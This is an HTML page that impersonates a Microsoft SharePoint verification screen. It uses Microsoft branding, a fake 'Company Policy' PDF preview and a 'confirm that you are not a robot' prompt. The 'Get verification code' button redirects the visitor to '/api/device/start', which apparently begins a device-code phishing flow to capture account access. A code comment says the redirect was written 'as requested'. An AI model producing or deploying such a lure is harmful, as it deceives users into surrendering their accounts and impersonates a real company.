<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SharePoint · Document Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #939ba2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        
        /* Card Layout */
        .card { background: white; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); padding: 40px; text-align: center; width: 100%; max-width: 450px; }
        
        /* Logos */
        .logo-area { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; font-size: 16px; }
        .ms-grid { display: grid; grid-template-columns: 10px 10px; gap: 2px; }
        .ms-grid div { width: 10px; height: 10px; }
        
        /* Text Styling */
        h1 { font-size: 24px; font-weight: 700; color: #1b1b1b; margin-bottom: 16px; line-height: 1.2; }
        .subtitle { font-size: 14px; color: #444; margin-bottom: 32px; line-height: 1.5; }
        
        /* Document Preview Box */
        .doc-preview { border: 1px solid #dcdcdc; border-radius: 4px; padding: 15px; text-align: left; margin-bottom: 25px; display: flex; align-items: center; gap: 15px; }
        .doc-preview-name { font-size: 14px; font-weight: 700; color: #000; margin-bottom: 2px; }
        .doc-preview-meta { font-size: 13px; color: #555; }
        
        /* Button & Footer */
        .btn-primary { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 2px; font-size: 15px; font-weight: 600; cursor: pointer; }
        .btn-primary:hover { background: #005a9e; }
        .footer { margin-top: 30px; font-size: 12px; color: #767676; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo-area">
            <div class="ms-grid">
                <div style="background-color: #f25022;"></div>
                <div style="background-color: #7fba00;"></div>
                <div style="background-color: #00a4ef;"></div>
                <div style="background-color: #ffb900;"></div>
            </div>
            <span>+</span>
            <img src="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/webp/microsoft-sharepoint.webp" alt="SharePoint" style="width: 24px; height: 24px;">
            <span style="font-weight: 600; color: #201f1e;">SharePoint for Microsoft</span>
        </div>

        <h1>Please confirm that you are not a robot</h1>
        <p class="subtitle">This SharePoint site requires authentication. Complete the verification process to continue.</p>
        
        <div class="doc-preview">
            <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF" style="width: 30px; height: 30px; opacity: 0.7;">
            <div>
                <div class="doc-preview-name">Company Policy</div>
                <div class="doc-preview-meta">Company_Policy.pdf · 12 pages</div>
            </div>
        </div>

        <button class="btn-primary" onclick="startVerification()">Get verification code</button>
        
        <div class="footer">
            Microsoft account · SharePoint · Security · Privacy
        </div>
    </div>

    <script>
        function startVerification() { 
            // This function triggers the redirection as requested
            window.location.href = '/api/device/start'; 
        }
    </script>
</body>
</html>
